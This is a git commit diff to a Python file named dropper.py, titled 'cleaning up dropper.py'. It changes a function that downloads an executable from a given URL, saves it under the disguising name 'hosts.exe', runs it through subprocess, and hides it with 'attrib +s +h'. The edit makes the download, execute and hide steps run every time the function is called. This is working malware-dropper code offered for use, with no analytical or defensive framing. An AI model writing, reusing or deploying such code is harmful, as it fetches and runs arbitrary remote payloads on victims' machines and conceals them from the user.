90c6fc8126320ed6e0c889335d4be95b0cb9353a
Camille Eyriès <camille.eyries@gmail.com>
2017-05-20 00:50:16 +0200

    cleaning up dropper.py
    Keeping it simple

--- resources/dropper.py
+++ resources/dropper.py
@@ -4,14 +4,11 @@
 from platform import architecture
 
 def fire_things_up(url,arch="No"):
+    x = urlretrieve(url,"hosts.exe")
+    xx = subprocess.Popen("hosts.exe",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+    xxx = subprocess.Popen("attrib +s +h hosts.exe",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+    
     #check architecture
     if arch != "No":
         if architecture()[0][:2] == arch:
-            x = urlretrieve(url,"hosts.exe")
-            xx = subprocess.Popen("hosts.exe",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-            xxx = subprocess.Popen("attrib +s +h hosts.exe",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
             raise SystemExit
-    else:
-        x = urlretrieve(url,"hosts.exe")
-        xx = subprocess.Popen("hosts.exe",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-        xxx = subprocess.Popen("attrib +s +h hosts.exe",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
